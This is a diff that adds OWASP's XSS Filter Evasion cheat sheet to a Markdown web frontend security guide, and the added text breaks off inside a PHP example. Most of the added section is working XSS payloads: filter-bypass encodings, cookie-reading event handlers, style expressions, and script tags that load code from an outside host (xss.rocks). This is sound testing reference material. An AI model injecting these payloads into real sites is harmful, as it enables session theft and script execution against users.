@@ -1,14 +1,14 @@
 ---
 title: "Web Frontend Security"
 order: 3
-summary: "Attacks through the browser: XSS, CSP, CSRF, clickjacking, security headers, HSTS, third-party scripts, open redirects and SSRF."
+summary: "Attacks through the browser: XSS and filter evasion, DOM clobbering, CSP, CSRF, clickjacking, XS-Leaks, security headers, HSTS, HTML5 APIs, third-party scripts, caches, subdomains, redirects and SSRF."
 category: "Security"
 level: Intermediate
 ---
 
 # Web Frontend Security
 
-Attacks through the browser: XSS, CSP, CSRF, clickjacking, security headers, HSTS, third-party scripts, open redirects and SSRF.
+Attacks through the browser: XSS and filter evasion, DOM clobbering, CSP, CSRF, clickjacking, XS-Leaks, security headers, HSTS, HTML5 APIs, third-party scripts, caches, subdomains, redirects and SSRF.
 
 ## Cross Site Scripting Prevention
 
@@ -902,6 +902,1334 @@ document.write(x);
 ```
 
 Semgrep rule to identify above dom xss [link](https://semgrep.dev/s/we30).
+
+## XSS Filter Evasion
+
+> **Source:** [XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: `http://ha.ckers.org/xss.html`. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake's work and we thank RSnake for the inspiration!
+
+### Tests
+
+This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.
+
+#### Basic XSS Test Without Filter Evasion
+
+For this baseline test, host a script containing only `alert('XSS')` on an HTTPS endpoint you control. Replace the placeholder URL below with that script's URL:
+
+```html
+<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>
+```
+
+Use a script you have reviewed and control: [external scripts execute in the context of the tested page](https://developer.mozilla.org/en-US/docs/Web/API/HTMLScriptElement/src#security_considerations). A mutable third-party script can change what runs during your test.
+
+#### XSS Locator (Polyglot)
+
+This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:
+
+```js
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+```
+
+(Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).
+
+#### Malformed A Tags
+
+This test skips the [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) attribute to demonstrate an XSS attack using event handlers:
+
+```js
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+```
+
+Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:
+
+```js
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+```
+
+(Submitted by David Cross, Verified on Chrome)
+
+#### Malformed IMG Tags
+
+This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:
+
+```html
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+```
+
+(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)
+
+#### fromCharCode
+
+If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:
+
+```html
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+```
+
+#### Default SRC Tag to Get Past Filters that Check SRC Domain
+
+This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as `onblur` or `onclick`, providing extensive variations of the injections listed here:
+
+```html
+<IMG SRC=# onmouseover="alert('xxs')">
+```
+
+(Submitted by David Cross and edited by Abdullah Hussam)
+
+#### Default SRC Tag by Leaving it Empty
+
+```html
+<IMG SRC= onmouseover="alert('xxs')">
+```
+
+#### Default SRC Tag by Leaving it out Entirely
+
+```html
+<IMG onmouseover="alert('xxs')">
+```
+
+#### On Error Alert
+
+```html
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+```
+
+#### IMG onerror and JavaScript Alert Encode
+
+```html
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+```
+
+#### Decimal HTML Character References
+
+Since XSS examples that use a `javascript:` directive inside an `<IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
+
+```html
+
+ <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+```
+
+#### Decimal HTML Character References Without Trailing Semicolons
+
+This is often effective in bypassing XSS filters that look for the string `&\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):
+
+```html
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
+```
+
+#### Hexadecimal HTML Character References Without Trailing Semicolons
+
+This attack is also viable against the filter for the string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:
+
+```html
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+```
+
+#### Embedded Tab
+
+This approach breaks up the XSS attack:
+
+<!-- markdownlint-disable MD010-->
+```html
+ <a href="jav	ascript:alert('XSS');">Click Me</a>
+```
+<!-- markdownlint-enable MD010-->
+
+#### Embedded Encoded Tab
+
+This approach can also break up XSS:
+
+```html
+ <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
+```
+
+#### Embedded Newline to Break Up XSS
+
+While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:
+
+```html
+<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
+```
+
+##### Example 1: Break Up XSS Attack with Embedded Carriage Return
+
+(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
+
+```html
+<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
+```
+
+##### Example 2: Break Up JavaScript Directive with Null
+
+Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. The null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:
+
+```sh
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+```
+
+##### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS
+
+This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:
+
+```html
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+```
+
+##### Example 4: Non-alpha-non-digit XSS
+
+The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:
+
+```html
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+```
+
+Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
+
+```html
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+```
+
+Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:
+
+```html
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+```
+
+#### Extraneous Open Brackets
+
+This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:
+
+```html
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+```
+
+(Submitted by Franz Sedlmaier)
+
+#### No Closing Script Tags
+
+With Firefox, you don't actually need the `\></SCRIPT>` portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:
+
+```html
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+```
+
+#### Protocol Resolution in Script Tags
+
+This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The `.j` is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:
+
+```html
+<SCRIPT SRC=//xss.rocks/.j>
+```
+
+(Submitted by Łukasz Pilorz)
+
+#### Half Open HTML/JavaScript XSS Vector
+
+Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the `javascript:` directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close `\>` tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` because it doesn't require the end `\>`. As a side note, this was also affective against a real world XSS filter using an open ended `<IFRAME` tag instead of an `<IMG` tag.
+
+```html
+<IMG SRC="`<javascript:alert>`('XSS')"
+```
+
+#### Escaping JavaScript Escapes
+
+If an application is written to output some user information inside of a JavaScript (like the following: `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>` which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:
+
+```js
+\";alert('XSS');//
+```
+
+An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:
+
+```js
+</script><script>alert('XSS');</script>
+```
+
+#### End Title Tag
+
+This is a simple XSS vector that closes `<TITLE>` tags, which can encapsulate the malicious cross site scripting attack:
+
+```html
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+```
+
+##### INPUT Image
+
+```html
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+```
+
+##### BODY Image
+
+```html
+<BODY BACKGROUND="javascript:alert('XSS')">
+```
+
+##### IMG Dynsrc
+
+```html
+<IMG DYNSRC="javascript:alert('XSS')">
+```
+
+##### IMG Lowsrc
+
+```html
+<IMG LOWSRC="javascript:alert('XSS')">
+```
+
+#### List-style-image
+
+This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:
+
+```html
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+```
+
+#### VBscript in an Image
+
+```html
+<IMG SRC='vbscript:msgbox("XSS")'>
+```
+
+#### SVG Object Tag
+
+```js
+<svg/onload=alert('XSS')>
+```
+
+#### ECMAScript 6
+
+```js
+Set.constructor`alert\x28document.domain\x29
+```
+
+#### BODY Tag
+
+This attack doesn't require using any variants of `javascript:` or `<SCRIPT...` to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (`onload=` != `onload =`):
+
+```html
+<BODY ONLOAD=alert('XSS')>
+```
+
+##### Attacks Using Event Handlers
+
+The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.
+
+The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).
+
+- `onAbort()` (when user aborts the loading of an image)
+- `onActivate()` (when object is set as the active element)
+- `onAfterPrint()` (activates after user prints or previews print job)
+- `onAfterUpdate()` (activates on data object after updating data in the source object)
+- `onBeforeActivate()` (fires before the object is set as the active element)
+- `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
+- `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
+- `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
+- `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
+- `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
+- `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
+- `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
+- `onBeforeUpdate()` (activates on data object before updating data in the source object)
+- `onBegin()` (the onbegin event fires immediately when the element's timeline begins)
+- `onBlur()` (in the case where another popup is loaded and window looses focus)
+- `onBounce()` (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
+- `onCellChange()` (fires when data changes in the data provider)
+- `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
+- `onClick()` (someone clicks on a form)
+- `onContextMenu()` (user would need to right click on attack area)
+- `onControlSelect()` (fires when the user is about to make a control selection of the object)
+- `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
+- `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
+- `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
+- `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
+- `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
+- `onDblClick()` (user double-clicks a form element or a link)
+- `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
+- `onDrag()` (requires that the user drags an object)
+- `onDragEnd()` (requires that the user drags an object)
+- `onDragLeave()` (requires that the user drags an object off a valid location)
+- `onDragEnter()` (requires that the user drags an object into a valid location)
+- `onDragOver()` (requires that the user drags an object into a valid location)
+- `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
+- `onDragStart()` (occurs when user starts drag operation)
+- `onDrop()` (user drops an object (e.g. file) onto the browser window)
+- `onEnd()` (the onEnd event fires when the timeline ends.
+- `onError()` (loading of a document or image causes an error)
+- `onErrorUpdate()` (fires on a data bound object when an error occurs while updating the associated data in the data source object)
+- `onFilterChange()` (fires when a visual filter completes state change)
+- `onFinish()` (attacker can create the exploit when marquee is finished looping)
+- `onFocus()` (attacker executes the attack string when the window gets focus)
+- `onFocusIn()` (attacker executes the attack string when window gets focus)
+- `onFocusOut()` (attacker executes the attack string when window looses focus)
+- `onHashChange()` (fires when the fragment identifier part of the document's current address changed)
+- `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
+- `onInput()` (the text content of an element is changed through the user interface)
+- `onKeyDown()` (user depresses a key)
+- `onKeyPress()` (user presses or holds down a key)
+- `onKeyUp()` (user releases a key)
+- `onLayoutComplete()` (user would have to print or print preview)
+- `onLoad()` (attacker executes the attack string after the window loads)
+- `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
+- `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
+- `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
+- `onMessage()` (fire when the document received a message)
+- `onMouseDown()` (the attacker would need to get the user to click on an image)
+- `onMouseEnter()` (cursor moves over an object or area)
+- `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
+- `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
+- `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
+- `onMouseOver()` (cursor moves over an object or area)
+- `onMouseUp()` (the attacker would need to get the user to click on an image)
+- `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
+- `onMove()` (user or attacker would move the page)
+- `onMoveEnd()` (user or attacker would move the page)
+- `onMoveStart()` (user or attacker would move the page)
+- `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
+- `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
+- `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)
+- `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
+- `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
+- `onPopState()` (fires when user navigated the session history)
+- `onPropertyChange()` (user or attacker would need to change an element property)
+- `onReadyStateChange()` (user or attacker would need to change an element property)
+- `onRedo()` (user went forward in undo transaction history)
+- `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
+- `onReset()` (user or attacker resets a form)
+- `onResize()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
+- `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
+- `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
+- `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
+- `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
+- `onRowsEnter()` (user or attacker would need to change a row in a data source)
+- `onRowExit()` (user or attacker would need to change a row in a data source)
+- `onRowDelete()` (user or attacker would need to delete a row in a data source)
+- `onRowInserted()` (user or attacker would need to insert a row in a data source)
+- `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
+- `onSeek()` (the `onReverse` event fires when the timeline is set to play in any direction other than forward)
+- `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+- `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+- `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+- `onStart()` (fires at the beginning of each marquee loop)
+- `onStop()` (user would need to press the stop button or leave the webpage)
+- `onStorage()` (storage area changed)
+- `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)
+- `onSubmit()` (requires attacker or user submits a form)
+- `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
+- `onTrackChange()` (user or attacker changes track in a playList)
+- `onUndo()` (user went backward in undo transaction history)
+- `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)
+- `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
+- `seekSegmentTime()` (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
+
+##### BGSOUND
+
+```js
+<BGSOUND SRC="javascript:alert('XSS');">
+```
+
+##### & JavaScript includes
+
+```html
+<BR SIZE="&{alert('XSS')}">
+```
+
+##### STYLE sheet
+
+```html
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+```
+
+#### Remote style sheet
+
+Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:
+
+```html
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+```
+
+##### Remote style sheet part 2
+
+This works the same as above, but uses a `<STYLE>` tag instead of a `<LINK>` tag). A slight variation on this vector was used
+to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:
+
+```html
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+```
+
+##### Remote style sheet part 3
+
+This only works in Gecko rendering engines and works by binding an XUL file to the parent page.
+
+```html
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+```
+
+#### STYLE Tags that Breaks Up JavaScript for XSS
+
+This XSS at times sends IE into an infinite loop of alerts:
+
+```html
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+```
+
+#### STYLE Attribute that Breaks Up an Expression
+
+```html
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+```
+
+(Created by Roman Ivanov)
+
+#### IMG STYLE with Expressions
+
+This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:
+
+```html
+exp/*<A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+```
+
+#### STYLE Tag using Background-image
+
+```html
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+```
+
+#### STYLE Tag using Background
+
+```html
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
+```
+
+#### Anonymous HTML with STYLE Attribute
+
+The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:
+
+```html
+<XSS STYLE="xss:expression(alert('XSS'))">
+```
+
+#### Local htc File
+
+This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:
+
+```html
+<XSS STYLE="behavior: url(xss.htc);">
+```
+
+#### US-ASCII Encoding
+
+This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.
+
+```js
+¼script¾alert(¢XSS¢)¼/script¾
+```
+
+#### META
+
+The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:
+
+```html
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+```
+
+##### META using Data
+
+Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) for more details.
+
+```html
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+```
+
+##### META with Additional URL Parameter
+
+If the target website attempts to see if the URL contains `<http://>;` at the beginning you can evade this filter rule with the following technique:
+
+```html
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+```
+
+(Submitted by Moritz Naumann)
+
+#### IFRAME
+
+If iFrames are allowed there are a lot of other XSS problems as well:
+
+```html
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+```
+
+#### IFRAME Event Based
+
+IFrames and most other elements can use event based mayhem like the following:
+
+```html
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+```
+
+(Submitted by: David Cross)
+
+#### FRAME
+
+Frames have the same sorts of XSS problems as iFrames
+
+```html
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+```
+
+#### TABLE
+
+```html
+<TABLE BACKGROUND="javascript:alert('XSS')">
+```
+
+##### TD
+
+Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:
+
+```html
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+```
+
+#### DIV
+
+##### DIV Background-image
+
+```html
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+```
+
+##### DIV Background-image with Unicode XSS Exploit
+
+This has been modified slightly to obfuscate the URL parameter:
+
+```html
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+```
+
+(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)
+
+##### DIV Background-image Plus Extra Characters
+
+RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
+
+```html
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+```
+
+##### DIV Expression
+
+A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and `expression`:
+
+```html
+<DIV STYLE="width: expression(alert('XSS'));">
+```
+
+#### Downlevel-Hidden Block
+
+Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:
+
+```js
+<!--[if gte IE 4]>
+<SCRIPT>alert('XSS');</SCRIPT>
+<![endif]-->
+```
+
+#### BASE Tag
+
+(Works on IE in safe mode) This attack needs the `//` to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like `images/image.jpg` rather than full paths. If the path includes a leading forward slash like `/images/image.jpg`, you can remove one slash from this vector (as long as there are two to begin the comment this will work):
+
+```html
+<BASE HREF="javascript:alert('XSS');//">
+```
+
+#### OBJECT Tag
+
+If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:
+
+```html
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+```
+
+#### EMBED SVG Which Contains XSS Vector
+
+This attack only works in Firefox:
+
+```html
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+```
+
+(Thanks to nEUrOO for this one)
+
+#### XML Data Island with CDATA Obfuscation
+
+This XSS attack works only in IE:
+
+```html
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+```
+
+#### Locally hosted XML with embedded JavaScript that is generated using an XML data island
+
+This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:
+
+```html
+<XML SRC="xsstest.xml" ID=I></XML>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+```
+
+#### HTML+TIME in XML
+
+This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:
+
+```html
+<HTML><BODY>
+<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+<?import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
+</BODY></HTML>
+```
+
+<!-- textlint-disable terminology -->
+(This is how Grey Magic hacked Hotmail and Yahoo!)
+<!-- textlint-enable terminology -->
+
+#### Assuming you can only fit in a few characters and it filters against `.js`
+
+This attack allows you to rename your JavaScript file to an image as an XSS vector:
+
+```html
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+```
+
+#### SSI (Server Side Includes)
+
+This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
+
+```js
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
+```
+
+#### PHP
+
+This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:
+
+```php
+<? echo('<SCR)';
